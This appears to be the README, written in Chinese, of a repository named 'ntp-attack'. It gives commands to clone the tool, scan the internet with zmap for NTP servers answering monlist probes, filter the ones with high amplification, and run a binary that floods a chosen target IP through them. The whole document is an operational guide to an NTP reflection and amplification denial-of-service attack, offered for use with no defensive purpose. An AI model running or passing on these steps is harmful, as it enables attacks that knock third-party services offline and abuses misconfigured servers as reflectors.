# ntp-attack

请先安装 zmap unzip git

克隆并解压
`
git clone https://github.com/iamfeiwu/ntp-attack && cd ntp-attack && unzip ntp.zip
`

扫描列表
`
zmap -p 123 -M udp --probe-args=file:ntp_123_monlist.pkt -o 1.txt
`


提权
`
chmod 777 ntp &&
chmod 777 ntpchecker
`

检查列表
`
./ntpchecker 1.txt 2.txt 1 0 1
`

过滤
`
awk '$2>419{print $1}' 2.txt | sort -n | uniq | sort -R > ntplist.txt
`

执行可执行文件
`
./ntp <target IP> <port> <reflection file> <threads> <pps limiter, -1 for no limit> <time>
`
